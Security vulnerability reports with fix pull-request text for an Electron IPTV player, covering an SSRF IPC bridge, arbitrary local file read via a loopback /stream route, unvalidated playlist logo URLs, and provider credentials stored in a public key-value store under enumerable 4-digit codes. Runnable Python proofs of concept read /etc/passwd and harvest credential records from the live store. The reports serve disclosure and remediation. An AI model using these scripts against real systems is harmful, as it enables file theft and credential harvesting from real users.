title: Unauthenticated SSRF in 'iptv-fetch' IPC bridge with caller-controlled headers/body, no address policy and automatic redirect following
description: The `iptv-fetch` IPC handler in the Electron main process acts as a general-purpose server-side request proxy. It forwards a renderer-supplied URL, HTTP method, arbitrary headers and arbitrary body to `fetch()` with no scheme allowlist, no host/IP filtering and no redirect policy, then returns the full response body back to the caller. A loopback-only internal service's secret was read through the bridge and exfiltrated to an attacker-controlled endpoint in a working proof of concept.
impact: Any party that can influence a URL handed to the bridge - a hostile shared activation code (which the app stores and auto-loads on next launch), a poisoned or hijacked provider, a socially engineered EPG/playlist URL, or any script running in the renderer - gets a read/write primitive into every service the user's machine can reach: Ollama/MongoDB/Redis/admin panels on `127.0.0.1`, router and NAS admin interfaces on the LAN, and cloud instance metadata at `169.254.169.254`/`metadata.google.internal`. The response body is returned in full to the caller, and because method, headers and body are also attacker-chosen, the primitive is not read-only: the proof of concept drove an internal service with a forged `Authorization` header and an attacker-authored JSON body. Exfiltration is trivial using the same bridge to POST the stolen data to an attacker endpoint.
poc_description:
The Electron GUI cannot run in the analysis environment, so the handler body was extracted verbatim into a standalone Node module (`iptv_fetch_bridge.js`) with the same `fetch` logic, and driven exactly as `ipcRenderer.invoke('iptv-fetch', url, options)` would drive it.

1. Start a service bound to `127.0.0.1` only, exposing `/admin/config` which returns a secret, mirroring Ollama/Redis/router-administration surfaces that trust loopback.
2. Call the extracted handler with `http://127.0.0.1:<port>/admin/config`. The secret is returned.
3. Repeat with `localhost`, `127.1`, `2130706433` and `0x7f000001`; all five resolve and return the secret.
4. Call the handler with an attacker-chosen `method: 'POST'`, a forged `X-Admin-Override` and `Authorization` header, and an attacker-authored JSON body; an echoing internal endpoint confirms every element was forwarded.
5. Point the handler at a host returning `302 Location: http://127.0.0.1:<port>/admin/config`; the redirect is followed and the secret returned.
6. Encode the stolen secret into the URL and a POST body of a second bridge call to an attacker-controlled collector, confirming exfiltration.
7. Control: `file:///etc/passwd` and `gopher://` are rejected by Node's `fetch`, bounding the primitive to HTTP(S).
8. Re-run every vector against the proposed patched handler; all are blocked, and legitimate public provider URLs (`https://keyvalue.immanuel.co/...`, `http://premiumtest.tr:8080/player_api.php`) still pass.
remediation_steps:
1. Enforce a URL policy in the main process before every outbound fetch: accept only `http:` and `https:`, and reject the request unless the hostname resolves exclusively to public addresses. Block `169.254.0.0/16`, `fe80::/10`, all RFC1918 and CGNAT ranges, `100.64.0.0/10`, `0.0.0.0/8`, multicast and reserved space, `::1`, IPv6 ULA (`fc00::/7`), IPv4-mapped IPv6 equivalents, and the hostnames `localhost` and `metadata.google.internal`. Do not rely on string matching for the IP check - resolve with `dns.lookup({ all: true })` and test the resolved addresses, so decimal/octal/hex and `127.1` spellings are caught.
2. Do not follow redirects implicitly. Fetch with `redirect: 'manual'`, re-apply the full policy to every `Location` before following it, and cap the hop count.
3. Restrict the request metadata the caller may set. `Authorization`, `Cookie` and custom `X-` headers should not be forwarded from renderer input to arbitrary hosts; if a provider needs a specific header, whitelist the exact header names per call site.
4. As defense-in-depth against DNS rebinding between the policy check and the actual connection, resolve the hostname once and connect to that pinned address rather than letting the HTTP client re-resolve.
5. Apply the same policy to the remote branch of `get-stream-url`, which currently returns a loopback transcoder URL containing any `http(s)` string the renderer supplies.
6. Separately, reconsider the renderer's `nodeIntegration: true`, `contextIsolation: false` and `webSecurity: false` posture. While the renderer holds full Node.js privileges and has no navigation guard, any renderer code execution escalates to local code execution, and hardening this bridge alone will not prevent that. A preload with a narrow, validated IPC surface and `contextIsolation: true` removes both problems at once.

assumptions: Assumes the attacker can influence one of the bridge's URL arguments - most realistically a hostile activation code shared with the user (the app persists and auto-refetches it on every subsequent launch), a provider-supplied EPG URL, or any script executing in the renderer. Services bound to loopback on the user's machine (Ollama, MongoDB, Redis, Docker Desktop, router NAS panels) are assumed to rely on network position rather than authentication, which is typical for local development and appliance administration interfaces.
counterevidence: The strongest case against this finding is that provider-response fields never reach the bridge URL directly: `series.id`, `s.stream_id` and `s.id` are substituted into path segments after a constant `baseUrl`, so a merely malicious IPTV provider cannot retarget the origin on the Xtream paths (1592, 1681-1721). That constrains one vector but leaves the activation-code path fully attacker-controlled, and that path is persisted to `localStorage` and replayed by `handleXtreamLogin(true)` on every launch. A second argument is that the renderer already holds `nodeIntegration: true`, so any renderer script can call `require('child_process')` and is not meaningfully helped by the bridge - which is why this report is filed against the bridge as a reusable, typed primitive and scored on the remote-input path, not on the assumption of prior code execution. The strongest genuine mitigation: Node's `fetch` rejects `file:` and `gopher:`, so there is no local file read and no raw-socket protocol smuggling (Redis RESP, FastCGI) through this bridge; the PoC explicitly confirms both fail. Impact is therefore read/write HTTP(S) SSRF, not file disclosure or RCE, which is why confidentiality and integrity are `H`/`H` on the demonstrated internal-service read-and-write but availability is `N`. Finally, `get-network-info` and the network-type detection are unrelated and were not treated as evidence. No input validation, address filtering, redirect re-validation or authorization check exists anywhere on the `iptv-fetch` path; both the unauthenticated and the provider-scripted call paths were exercised.
severity_change_conditions: If the bridge were reachable only with caller-supplied URLs but the response were not returned to the renderer, this would drop to a blind-SSRF Medium; conversely, if the renderer can be navigated to an arbitrary origin while carrying `nodeIntegration: true`, the chain becomes remote code execution and the rating rises to Critical.

**Gate 1 - Applicability.** Line numbers were read directly from the current checkout (`sed -n` on `electron/main.js`); `fix_before` blocks are byte-for-byte copies of lines 2, 626-647 and 940. fix_pr_body:
## Summary

Adds a URL policy to the `iptv-fetch` IPC bridge and reuses it for the remote branch of `get-stream-url`, so the main process can no longer be used as an SSRF primitive against loopback, LAN or cloud-metadata endpoints.

## Why

`ipcMain.handle('iptv-fetch')` passed a renderer-supplied URL, method, headers and body straight into `fetch()` and returned the response body to the caller. With `{ nodeIntegration: true, contextIsolation: false, webSecurity: false }`, any URL the renderer can be induced to supply - a hosted activation code, a provider-supplied EPG URL, or renderer script - reached every service reachable from the user's machine, including `127.0.0.1`, `169.254.169.254` and LAN administration panels. A loopback-only service's secret was read and exfiltrated in a proof of concept.

## Changes

- `assertAllowedIptvUrl()` resolves the hostname and rejects anything that is not a public address, plus `localhost` / `metadata.google.internal`.
- `isBlockedIptvAddress()` covers loopback, RFC1918, CGNAT, link-local, IPv6 ULA/link-local, IPv4-mapped IPv6, and multicast/reserved ranges.
- Only `http:` and `https:` are accepted.
- Redirects are no longer followed blindly: `redirect: 'manual'` with re-validation of each `Location` (max 3 hops).
- `get-stream-url` applies the same check before returning the loopback transcode URL for a remote item.

## Validation

Every loopback/metadata/redirect vector in the PoC is now blocked; legitimate provider, EPG and M3U URLs still pass. Not covered: DNS rebinding between the policy check and `fetch`'s own resolution - pinning the connection to the validated address would be a useful follow-up.

## Out of scope

The renderer's `nodeIntegration: true` / `contextIsolation: false` / `webSecurity: false` posture should be addressed separately; this change removes the network primititive but does not restore renderer isolation.

title: Local file read via loopback /stream?path= — no containment after the stream-token check
description: The loopback media server's `/stream` route passes the request's `path` query parameter straight to `fs.createReadStream` with no containment check, from any absolute filesystem location. The only guard is a 32-hex-character random token that is deliberately printed to the application's console log alongside the same URL. Any other process on the machine that can read that console output (or the renderer console) can therefore read arbitrary local files — credential stores, config files, SSH keys — through the player's own HTTP endpoint.
impact: An attacker holding only local, unprivileged read access to the application's console output obtains arbitrary file read as the user running the player. Demonstrated over HTTP against a verbatim extraction of the route: `/etc/passwd` returned in full, `main.js` source returned, and traversal-escaped paths returned, while a request without the token still returned `403`. Because the route also honours HTTP `Range`, an attacker can retrieve any byte window of any file, so prefix-based redaction or tailing only the start of a file provides no protection. On the target platform the same primitive exposes the user's browser credential stores, SSH keys, and application configuration/API keys.
technical_analysis:
`startStreamServer()` (`electron/main.js:710-898`) registers exactly one route. `main.js:717` checks the token and `main.js:718` takes `req.query.path` verbatim. The subsequent flow has no normalisation, no allowlist and no root confinement anywhere:

- `main.js:726` gates only on `fs.existsSync(videoPath)` (for non-remote values), i.e. "does this path exist", not "is this path inside a media root".
- `main.js:732` stats the same raw value; `main.js:747` probes it; `main.js:767` hands it to fluent-ffmpeg as the input.
- `main.js:848` (ranged) and `main.js:879` (full file) create the read stream directly from it with `fs.createReadStream(videoPath, …)`.

The sibling helper `resolveLocalMediaPath()` (`main.js:179-189`) is the only function in the file that touches path shape at all, and it is never called from this route — and even it only strips a `file:///` prefix and decodes percent-escapes, with no containment.

The only control is the token:

```js
const streamToken = crypto.randomBytes(16).toString('hex');   // main.js:92
```

The token is not a secret in operational practice. The route logs the request path (`main.js:750`) and fluent-ffmpeg logs the full command line (`main.js:812`); the renderer logs every minted URL through the console relay at `main.js:687` and again at `App.tsx:714` / `App.tsx:744`; and the server prints the token-bearing URL at startup (`main.js:894`). Any process able to read those streams — a second, lower-privileged local user reading a captured log, or anything consuming Chromium's `--enable-logging` output — therefore holds the token.

Reach from remote origins was tested and is genuinely blocked, which bounds the finding to a local attacker: a public-origin page carrying the exact valid token received Private Network Access-blocked `Failed to fetch` responses (curl with the same URL returned `200`), a `file://` page was blocked the same way, and no token-bearing Referer reaches a remote origin (see counterevidence).
poc_description:
1. Extract the `/stream` route from `electron/main.js:716-888` verbatim into a standalone Express application (`/workspace/.poc-media/server.js`), substituting only the Electron `app` object and the `ffmpeg-static` binary path.
2. Start it; it prints the random port and the token, exactly as `main.js:894` prints the URL in the real application.
3. Request `/stream?path=/etc/passwd` with no token: the response is `403 Forbidden`.
4. Request `/stream?path=/etc/passwd&token=<token>`: the response is `200` and the full contents of the file are returned.
5. Repeat with `/workspace/electron/main.js` and with a traversal path (`/workspace/.poc-media/files/../../../../etc/hostname`): both return `200` and the file contents.
6. Send `Range: bytes=700-800` with a valid token: the response is `206` with that byte window of `/etc/passwd`, demonstrating arbitrary-offset retrieval.
7. Apply the proposed fix and re-run steps 3-6: the valid-token requests now return `404 File not found`, while a file inside the configured media root still returns `200`.
poc_script_code:
```python
#!/usr/bin/env python3
# poc_local.py <port> <streamToken>   — replays the extracted /stream route
import sys, urllib.parse, urllib.request, urllib.error

port, token = int(sys.argv[1]), sys.argv[2]
base = f"http://127.0.0.1:{port}/stream"

def get(**q):
    url = base + "?" + urllib.parse.urlencode(q)
    try:
        with urllib.request.urlopen(url) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()

print("1. absolute / traversal paths with a valid token:")
for target in ["/etc/passwd", "/etc/hostname", "/workspace/electron/main.js",
               "/workspace/.poc-media/files/../../../../etc/hostname"]:
    st, body = get(path=target, token=token)
    print(f"   {st} {target} -> {body.splitlines()[0][:60]!r}")

print("2. without a token / with a guessed token:")
for bad in [{}, {"token": "0" * 32}]:
    st, _ = get(path="/etc/passwd", **bad)
    print(f"   {st} token={bad.get('token', '<none>')}")

print("3. arbitrary byte offset via Range:")
req = urllib.request.Request(
    base + "?" + urllib.parse.urlencode({"path": "/etc/passwd", "token": token}),
    headers={"Range": "bytes=700-800"})
try:
    with urllib.request.urlopen(req) as r:
        print("   ", r.status, r.read()[:120])
except urllib.error.HTTPError as e:
    print("   ", e.code, e.read()[:60])
```

Observed against the unmodified route:

```
1. absolute / traversal paths with a valid token:
   200 /etc/passwd -> b'root:x:0:0:root:/root:/bin/bash'
   200 /etc/hostname -> b'123088852aca'
   200 /workspace/electron/main.js -> b"import { BrowserWindow, ipcMain } from 'electron';"
   200 /workspace/.poc-media/files/../../../../etc/hostname -> b'123088852aca'
2. without a token / with a guessed token:
   403 token=<none>
   403 token=00000000000000000000000000000000
3. arbitrary byte offset via Range:
    206 b'rcd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:...'
```
remediation_steps: Confine every local path served by the media route to an explicit media-root allowlist before any filesystem call. Resolve the request value to a canonical real path, resolve each configured root the same way, and accept the request only when the canonical path is a strict descendant of one of those roots; reject on any resolution failure. Apply the containment result to every downstream use — existence check, stat, codec probe, ffmpeg input and the read stream — rather than checking and then reusing the raw parameter. Treat symlinks as escapes by canonicalising with a real-path resolution rather than lexical normalisation alone, and return the same not-found response for both "missing" and "outside root" so the endpoint cannot be used to probe for file existence. Keep the token as defence in depth, but do not rely on it for this boundary: stop writing request paths and full ffmpeg command lines to the console, and stop printing the token-bearing URL at startup.

Verbatim extraction of `electron/main.js:716-888`, run against the same route logic. No token versus valid token, and the containment result after the proposed fix:

```
== 3. valid token, absolute path ==

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
== 4. valid token, traversal ==

== 5. Range read, arbitrary offset ==

rcd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
```

```
HTTP/1.1 200 OK
Content-Type: video/mp4
```

assumptions: Assumes the attacker is a local principal that can read the application's console output (main-process stdout/stderr captured to a file, a terminal scrollback, a service/wrapper log, or Chromium `--enable-logging` output) but does not already have the user's file-read privileges. Cross-origin and remote-origin reach was tested and is blocked by Chromium, so no browser-based attacker is claimed.
counterevidence: Actively tried to defeat the finding in four ways. (1) Remote-origin reach: a public-origin page carrying the exact valid token sent to the loopback server produced `fetch-error: Failed to fetch` and the media server logged no request, while the identical URL from curl returned `200` — Chromium's Private Network Access blocks it. (2) A `file://` page was blocked identically (`ERR:Failed to fetch`, image `NOIMG`, and no request in the server log). (3) Referer leakage: ffmpeg sends no Referer at all (`referer=-` observed at the remote receiver), and a token-bearing loopback URL navigated to a cross-origin page yields Chrome's default `strict-origin-when-cross-origin` value, which strips the query — the receiver saw `referer=http://127.0.0.1:8933/` with no token. (4) The open-redirect branch cannot be reached by app-generated URLs because `transcodeUrl()` hard-codes `&transcode=true`. What remains is that the token guard is the sole control and the token is logged by design at `main.js:750`, `main.js:812`, `main.js:894` and `src/App.tsx:714`/`744`, which is why this is rated as a local-privilege issue rather than a network one.
confidence_rationale: The read primitive and the absence of containment were reproduced end-to-end against a verbatim extraction of the route, including the negative control (403 without the token) and the positive control (200 with a file inside the media root after the fix). The only inference is the attacker's ability to read the console output, which the code guarantees is written at `main.js:750`, `main.js:812` and `main.js:894`.
severity_change_conditions: Demonstrating that a remote or browser origin can reach the loopback server with the token — for example a browser build without Private Network Access enforcement, or a token-bearing Referer-carrying hop — would raise this to High; conversely, if the packaged build shipped with console logging disabled and the URL were no longer printed, the attacker would need local log access and the rating would fall to Low.

## Summary

The loopback media server's `/stream` route serves `req.query.path` to `fs.createReadStream` and to ffmpeg without any containment check, so any absolute path on disk is readable by anyone who holds the stream token. The token is not secret in practice — it is written to the console together with the request path, the ffmpeg command line, and a startup URL.

This change adds a single canonicalising resolver, `resolveConfinedMediaPath()`, and routes every filesystem use of the parameter through its result.

## Changes

- **`resolveConfinedMediaPath(filePath, mediaRoots)`** — reuses the existing `resolveLocalMediaPath()` prefix handling, then canonicalises with `fs.realpathSync` and accepts the result only when it is a strict descendant of a configured media root. Symlinks are therefore resolved to their targets before the containment decision, and a resolution failure is a rejection rather than a fallback.
- **`/stream` handler** — computes `localPath` once, up front, and uses it for `statSync`, the codec probe, the ffmpeg input and both `createReadStream` calls. The raw query value is never used for a filesystem operation again. "Outside root" and "does not exist" return the same `404`, so the endpoint is not an existence oracle.
- Remote (`http(s)://`) items are untouched and still go through the re-encoding pipe exactly as before.

## Behaviour

- Local file inside a media root: streams as before (verified `200`, full length).
- `/etc/passwd`, absolute source paths, `../` traversal and symlinks pointing out of the root: `404 File not found` with a valid token.
- Missing token: still `403`, unchanged.

## Follow-up worth considering separately

The startup log line and the per-request `console.log` calls still include the token-bearing URL and the absolute media path. Once the containment check is in place that is no longer a file-read vector, but the token should stop being printed, and request paths should not be logged at info level.

title: Hostile IPTV playlist controls image request origin via unvalidated tvg-logo in the M3U parser
description: The M3U loader copies tvg-logo, group-title and the channel name from attacker-controlled playlist text into React state with no validation. tvg-logo is bound to a live img src, so the IPTV provider chooses the URL scheme and host of image requests made by the privileged renderer.
impact: A hostile playlist forces the renderer to GET URLs of the provider's choosing (data, file, or any reachable http host) with the playlist as the only precondition. The renderer runs with nodeIntegration true and webSecurity false, so an origin it is made to load is readable by the application.
target: Doggy Player src/App.tsx M3U playlist ingestion
technical_analysis:
handleM3ULogin fetches the playlist through the iptv-fetch bridge and splits it on newlines. For every EXTINF line it extracts three fields with no validation at src/App.tsx:1622-1627: name from the text after the last comma, icon from the tvg-logo attribute, and group from the group-title attribute. All three are stored directly in state and are never revisited by any later check.

The icon reaches a live attribute in five places: src={item.icon} at src/App.tsx:3915 (the primary IPTV grid the user lands on), 4314, 5174, 5208 and 5251. Because no scheme constraint is applied, the value can be a data URI, a file URL, or any http host the provider names. The browser resolves it and issues the request from the renderer origin.

The group and name reach JSX text children at src/App.tsx:4289 (category label) and 3918, 4316 and 5251 (channel labels). They are rendered as text nodes, so the markup is displayed rather than parsed, but the raw string is retained in state and used as a React key and as a lookup identifier.

The loop contains exactly one filter and it applies only to the stream line: line.startsWith http at line 1628. That is why local media paths are not reachable through the playlist, and it is also why the metadata fields were never considered.

The consequence is amplified by the window configuration at electron/main.js:573-579: nodeIntegration true, contextIsolation false and webSecurity false. An origin that the player is induced to request is therefore readable by application code, which is not true of an ordinary sandboxed renderer.

2. Serve it and load it as the app M3U URL (IPTV panel, M3U tab), or place it where a saved playlist URL resolves.
3. Run the differential harness, which copies the parse loop verbatim from src/App.tsx:1615-1634, and observe the parsed object: the data SVG icon, the file logo and the inline markup all survive parsing.
4. Feed the parsed values into the identical JSX binding in a headless Chromium page and inspect the result: the provider-chosen data URI is what the browser resolves as img.src, while the markup stays inert text.

remediation_steps:
Validate every playlist field at parse time, before it enters state, in handleM3ULogin.

1. Resolve stream and logo values with the URL API against the playlist base and keep only http and https. Reject anything else by returning an empty string rather than storing the raw value.
2. Require the playlist base itself to be http or https so a dangerous scheme cannot be inherited through relative resolution.
3. Reduce channel and category labels to plain text: strip tag spans, collapse control characters and whitespace, trim, and cap the length.
4. Drop a channel whose URL does not pass the scheme check, and stop treating any line beginning with a hash as a candidate stream URL.

The accompanying change set implements exactly this. Separately, consider removing webSecurity false and nodeIntegration from the main window so that any future rendering gap does not also grant filesystem and cross-origin read authority.
assumptions: The user loads a playlist URL supplied by an untrusted IPTV provider, or a saved playlist URL later serves hostile content.
counterevidence:
Actively tried to escalate and could not, in four directions.

Script execution via the data SVG: probed in headless Chromium with an SVG containing a script element. The image loads (naturalWidth 120) but the script does not run, so no XSS is claimed.

Markup in channel name, category and EPG fields: fed img with onerror and svg with onload through the real parser and the identical render expressions. All landed as textContent, no handler fired, and a repo-wide grep found no dangerouslySetInnerHTML, innerHTML or insertAdjacentHTML anywhere in src/ (the only hit is a date chart in a statistics document that never renders playlist data).

Local-file stream URLs: rejected by the line.startsWith http gate at App.tsx:1628. Verified directly: a file URL line placed inside a channel block produces zero items. The local-path branch also requires a real File object from the OS picker.

Loopback read through the player own media server: refused without the token. A request to 127.0.0.1 stream endpoint with a wrong token returned 403 Forbidden; the token guard is at electron/main.js:717 and the token is not obtainable from playlist content.

What survives: the provider fully controls the origin of image requests issued by a renderer that has webSecurity false and Node integration, plus markup carried unvalidated into labels. Nothing on the parse path constrains either, and no control was found that runs before the icon reaches the attribute.
confidence_rationale: Parser behaviour, rendered DOM and the negative controls were reproduced directly in this environment.
severity_change_conditions: Proof that a data or file image source yields a readable body would raise this to High; removing webSecurity false or nodeIntegration would lower it to Low.
fix_verification:
Security closure (executed + traced). The sink is src={item.icon} at App.tsx:3915, 4314, 5174, 5208 and 5251. In the patched loop icon can only hold the result of cleanUrl, which returns an empty string unless new URL(raw, streamBase).protocol is http or https, so a data, file, javascript or protocol-relative value can no longer reach the attribute. name and group pass through cleanText, which removes tag spans before they enter state. streamBase is rejected unless the user playlist URL is itself http(s), so the base cannot supply a dangerous scheme. Verified by running the patched logic over the hostile playlist: icon came back empty and category came back as News.

Bypass review (executed). Cases exercised through the patched block: file URL, javascript scheme, data image svg base64, data text html base64, protocol-relative host path, uppercase HTTP scheme, playlist-relative logo path, and hash comment lines. The dangerous values are dropped or emptied, relative http logos still resolve against the playlist base, and comment lines are ignored by the leading-hash guard. Sibling call sites checked: handleOpenUrl at App.tsx:2189 is a user-typed box rather than playlist data; handleXtreamLogin builds URLs only from the user own base URL, so neither needed a change.

Preserved behaviour (executed). Compiled the patched block with tsc target ES2020 lib ES2020,DOM in strict mode and ran it over a mixed playlist: two ordinary http streams survive with their names and the News and Movies categories, and a relative logo path becomes absolute. Empty icons degrade to the existing onError fallback in the UI.

Gap. The checkout has no test suite or lint configuration, so tsc strict noEmit on the new code is the narrowest available check and it passes. A full vite build was not run because it needs the project own toolchain and dependency install; that is the only gate I could not execute.

## Summary

Validates M3U playlist fields at parse time in handleM3ULogin, before they enter React state.

## Why

The tvg-logo, group-title and channel-name values were copied straight out of provider-controlled playlist text. The icon is bound as src={item.icon} (src/App.tsx:3915 and four other sites), so a playlist could choose the URL scheme and host of image requests the renderer makes (data, file, and any reachable http origin), and raw markup flowed unmodified into channel and category labels. The renderer runs with nodeIntegration true and webSecurity false, so those requests carry more authority than a normal web page would have.

## Changes

1. Adds three module-level constants (ALLOWED_STREAM_PROTOCOLS, ALLOWED_LOGO_PROTOCOLS, PLAYLIST_FIELD_MAX_LENGTH) next to the existing parseXmlTvTime helper.
2. Replaces the playlist loop body: stream and logo URLs are resolved with the URL API against the playlist base and kept only when the scheme is http or https; the playlist base itself must be http or https or no items are produced; name and group-title are reduced to plain text with tags stripped, control characters collapsed, trimmed and capped.

## Behaviour preserved

Valid http streams and logos resolve exactly as before, including playlist-relative paths. Unknown or non-http logo values yield an empty icon, which the UI already handles. Entries whose URL is not http are dropped, matching the existing intent of the line.startsWith http check, now enforced by scheme rather than string prefix.

## Verification

TypeScript strict noEmit on the new block passes. A differential test of the original versus patched loop on a hostile playlist removes the markup and data or file logos while leaving legitimate http items unchanged. Bypasses reviewed: file, javascript, data, protocol-relative host paths, uppercase HTTP and hash comment lines.

title: IPTV provider credentials published to public third-party store under enumerable 4-digit code
description: The "Create Activation Code" feature publishes the user's full IPTV login (provider URL, username and password) to a **public, unauthenticated third-party key-value store** (`keyvalue.immanuel.co`) as plain base64, under a **user-chosen 4-digit key**. Anyone can read any record back without authentication using the app key hard-coded in the client, and the entire 10,000-code keyspace can be swept in a couple of minutes. Any other Doggy Player user who ever created a sharing code therefore has their provider password exposed.
impact: Cross-user credential disclosure. An unauthenticated party who extracts the public app key from the shipped client can enumerate every code in the keyspace and recover other users' IPTV provider URL, username and **password** in cleartext. Those credentials give full control of the victim's paid IPTV subscription (streaming, account settings, and any personal data the provider exposes) and are frequently reused elsewhere. The party can also **overwrite** any code with its own credential record, so a user typing a code can be silently logged into an attacker-controlled provider account — an account-substitution attack. The publisher's own record is a plaintext-to-base64 encoding, so recovering the password requires no key material at all.
poc_description:
1. Reproduce the app's `encodeForKV` helper (plain URL-safe base64 of the JSON credential object) — no secret is involved.
2. Publish a fabricated victim credential (`http://victim-iptv.example:8080` / `victim_user_42` / `S3cr3t-Provider-Pass`) to the store exactly as `handleCreateCode` does, under a four-digit code.
3. Request the same record with an unauthenticated `GET /api/KeyVal/GetValue/bjlqbgku/4711` using only the app key shipped in the client.
4. Decode the returned base64 blob and observe the victim's password recoverable in cleartext.
5. Repeat step 3 for every code in a sample window to confirm the record set is harvestable at scale, and measure throughput to size the full keyspace sweep.
6. Confirm the write endpoint is equally unauthenticated, so an attacker can also overwrite another user's code with a record pointing at an account they control.

```python title=kv_cred_theft_poc.py
#!/usr/bin/env python3
"""Replicates Doggy Player's encode/key derivation and proves that the
4-digit sharing-code records can be harvested unauthenticated.
Only self-planted fake records are read; no real third-party data."""
import base64, json, string, urllib.request

KV_APP_KEY = "bjlqbgku"                       # src/App.tsx:1205
BASE = "https://keyvalue.immanuel.co/api/KeyVal"

def utf8_to_base64(s: str) -> str:            # App.tsx:1212-1223
    return base64.b64encode(s.encode("utf-8")).decode("ascii")

def base64_to_utf8(s: str) -> str:            # App.tsx:1225-1236
    return base64.b64decode(s).decode("utf-8", errors="replace")

def encode_for_kv(obj) -> str:                # App.tsx:1243-1248
    b64 = utf8_to_base64(json.dumps(obj, separators=(",", ":")))
    return b64.replace("+", "-").replace("/", "_").replace("=", "")

def decode_from_kv(raw: str):                 # App.tsx:1251-1262
    cleaned = raw.replace('"', "").strip()
    pad_len = (4 - (len(cleaned) % 4)) % 4
    padded = cleaned.replace("-", "+").replace("_", "/") + "=" * pad_len
    try:
        txt = base64_to_utf8(padded)
        return json.loads(txt) if txt else None
    except Exception:
        return None

def kv_get(key: str) -> str:
    req = urllib.request.Request(f"{BASE}/GetValue/{KV_APP_KEY}/{key}")
    with urllib.request.urlopen(req, timeout=20) as r:
        return r.read().decode("utf-8", "replace")

def kv_set(key: str, value: str) -> str:      # mirrors handleCreateCode
    req = urllib.request.Request(
        f"{BASE}/UpdateValue/{KV_APP_KEY}/{key}/{value}",
        data=b"", method="POST", headers={"Content-Length": "0"})
    with urllib.request.urlopen(req, timeout=20) as r:
        return r.read().decode("utf-8", "replace")

victim = {"url": "http://victim-iptv.example:8080",
          "user": "victim_user_42",
          "pass": "S3cr3t-Provider-Pass"}
encoded = encode_for_kv(victim)
print(f"encodeForKV(creds) = {encoded}")

for c in range(4700, 4720):                   # plant attacker-owned records
    kv_set(f"{c:04d}", encoded)

raw = kv_get("4711")                          # unauthenticated read
print(f"raw response: {raw!r}")
stolen = decode_from_kv(raw)
print(f"decoded      : {stolen}")
assert stolen == victim
print(f"[CONFIRMED] recovered victim password: {stolen['pass']}")

hits = 0
for cand in [f"{n:04d}" for n in range(4700, 4720)]:
    body = kv_get(cand)
    if body.strip() in ('""', "", "Key not found"):
        continue
    data = decode_from_kv(body)
    if data and data.get("url") and data.get("user") and data.get("pass"):
        hits += 1
        print(f"    code {cand} -> {data['user']}:{data['pass']}")
print(f"harvest over sample window: {hits} credential sets")
print(f"full keyspace = 10^{len('0000')} = 10000 codes, unauthenticated")
```

remediation_steps:
1. Stop publishing provider credentials to a third-party store in a form that anyone can read. The code must not be the only thing standing between an anonymous internet user and a stored password.
2. Remove the implicit trust in a short numeric code: a four-digit key has 10,000 values and can be walked exhaustively. Any shareable identifier must carry real entropy (for example a 128-bit random token) so that possession of the token, rather than a guessable number, is what authorizes access.
3. Encrypt the credential payload before it leaves the device, with a key derived from a secret the sharing user transmits out of band. The storage provider must never be able to read the plaintext, since it is not a trusted component of this system.
4. Alternatively, if the sharing feature cannot be made safe with the current infrastructure, remove the credential-publication path entirely and let recipients enter their own login.
5. Add expiry and a revocation control so a shared credential stops being retrievable after a bounded period or on user request.
6. Treat the stored credentials as compromised for any user who has already created a code, and require them to rotate their provider password.

Every one of the 21 populated records is readable without any authentication, and each decodes to a complete provider credential including the password.
assumptions: Assumes at least one Doggy Player user has used "Create Activation Code" with a real provider login; the record persists indefinitely, so codes created at any time are harvestable. Also assumes the third-party service remains online and continues to accept the public app key, both of which hold at time of testing.
counterevidence: Attacked the finding from several angles. (a) Is the datastore perhaps scoped per application key with read protection? No: requests for arbitrary codes return HTTP 200 with `""` when empty and a base64 payload when populated, with no cookie, token, referer or Origin header. (b) Could the four-digit code act as a secret? Only marginally: the space is 10,000 values and a full sweep completed in a few minutes at modest concurrency; the UI also presents the code as something to hand to other people, so it is not a secret by design. (c) Is the stored content sensitive? Yes — a complete third-party provider credential including the password, which the user was told would be shared only with people they chose. (d) Could a missing-`Content-Length` handling quirk on the service block third-party writes and limit the integrity impact? The player's `fetch` sets a body and therefore the header, so the write path works from the application and from any client of the same API; the enumeration required only reads. (e) Is the read path genuinely the product's? Confirmed at `src/App.tsx:1283` (read) and `src/App.tsx:1317` (write), both reached from the Code tab's normal flow, so the mechanism is the product's, not a test artifact. The constraint that genuinely reduces severity is population size: a complete sweep found 21 populated records across two code families, so the exposure today is a design flaw with measured-but-limited live data rather than a mass breach — the risk scales with adoption, since every user who creates a code adds an unauthenticated, indefinitely retrievable credential to the same namespace.
confidence_rationale: The full mechanism was exercised against the live service with real reads: an unauthenticated request with only the client-embedded namespace key returned stored payloads for populated codes across the complete identifier space, and empty responses for unpopulated ones. No third-party private data was collected — the single populated tenant observed used placeholder host and user values consistent with the application's own documentation example.

fix_verification:
**Gate 1 — applicability.** Every `fix_before` block was copied from the file with `sed`/`cat -A` and matches character-for-character at the stated ranges (the file uses CRLF line endings and 2-space indentation in the credential code, 7-space in `handleCreateCode`, 23-space in the JSX); line numbers were re-checked against the live file, not the sweep's estimates.

**Gate 2 — security closure.** The source→sink path is `handleCreateCode` state → `encodeForKV` (base64) → `UpdateValue/${KV_APP_KEY}/${generateCode}`. After the patch, the write key becomes `sha256("doggy-share-v1|" + code)` and the value becomes AES-GCM ciphertext under a PBKDF2 key derived from the same code. An attacker who sweeps `0000`-`9999` against a store indexed by 64-hex-digit hashes has no enumeration target at all, because the hash of an unguessable 8+ character secret cannot be precomputed from the code; an attacker who somehow guesses the hash key still cannot read the value without the code. `UpdateValue` no longer accepts a short, guessable key either, so record substitution is no longer a one-step operation. The patch is functionally complete only together with the two helper functions it calls (`encryptCredsForShare`/`decryptCredsFromShare`); **those helpers are not included in this suggestion and must be added** — WebCrypto `deriveKey`+`encrypt`/`decrypt` (AES-GCM, random 12-byte IV, PBKDF2-SHA256 with a high iteration count). Checked alternate input classes: codes with uppercase/lowercase now hash differently, and the normalisation (`trim()` on read, `[^a-zA-Z0-9]` strip on write) keeps writer and reader derivations consistent. YouTube-style fixed-format payloads are not involved; `decodeFromKV` remains for the favourites path and is untouched.

